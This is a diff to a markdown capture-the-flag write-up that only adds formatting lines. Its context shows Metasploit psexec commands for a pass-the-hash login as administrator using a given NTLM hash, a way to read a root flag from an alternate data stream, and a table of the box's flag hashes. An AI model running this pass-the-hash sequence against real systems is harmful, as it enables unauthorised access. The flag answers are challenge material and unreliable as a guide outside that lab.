@@ -61,11 +61,14 @@ msf exploit(windows/smb/psexec) > set smbuser administrator
 msf exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 msf exploit(windows/smb/psexec) > set lport 8888
 msf exploit(windows/smb/psexec) > exploit
+```
+
 8. There is an alternate data stream applied to the ROOT flag. to view flag
 dir /R
 more < hm.txt:root.txt
 
 | Flag | Hash |
+|----|----|
 | ROOT | afbc5bd4b615a60648cec41c6ac92530 |
 | USER | e3232272596fb47950d59c4cf1e7066a |
 
